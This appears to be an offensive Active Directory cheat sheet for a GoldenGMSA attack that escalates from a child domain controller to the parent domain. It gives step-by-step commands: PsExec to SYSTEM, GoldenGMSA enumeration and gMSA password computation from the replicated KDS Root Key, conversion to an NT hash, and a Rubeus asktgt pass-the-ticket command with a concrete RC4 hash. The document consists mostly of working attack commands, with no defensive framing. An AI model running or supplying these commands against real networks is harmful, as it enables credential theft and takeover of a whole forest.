# 14.08 GoldenGMSA Attack Child→Parent via Config NC

> As SYSTEM on a child DC, query the replicated KDS Root Key from the Configuration NC to recompute any parent-domain gMSA password.

## Overview

As SYSTEM on a child DC, query the local Configuration NC replica (which contains the KDS Root Key replication) to compute the gMSA password for any gMSA in the parent domain. Can be done online (tool fetches everything automatically) or offline (extract kdskey and pwdid manually then compute). Convert the Base64 password to an NT hash and use Rubeus to get a TGT.

## Steps

- Escalate to SYSTEM on child DC using **PsExec**
- Enumerate gMSA accounts in parent domain with **GoldenGMSA.exe gmsainfo**
- **Online**: compute password directly by specifying --forest (child) and --domain (parent)
- **Offline**: get kdsinfo from child DC as SYSTEM, get gmsainfo SID and msds-ManagedPasswordID from parent, then compute with all three args
- Convert Base64 password blob to NT hash with Python (hashlib MD4 or pycryptodome)
- Request TGT with **Rubeus asktgt /rc4**

## Commands

### gmsainfo

```powershell
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain <DOMAIN>.ad
```

### Online compute

```powershell
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.<DOMAIN>.ad --domain <DOMAIN>.ad
```

### kdsinfo

```powershell
PS C:\Tools> .\GoldenGMSA.exe kdsinfo --forest dev.<DOMAIN>.ad
```

### Offline compute

```powershell
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey  --pwdid AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
```

### Convert password to NT hash

```bash
python3 convert-to-nt.py
```

### Request TGT

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:<DOMAIN>.ad /ptt
```
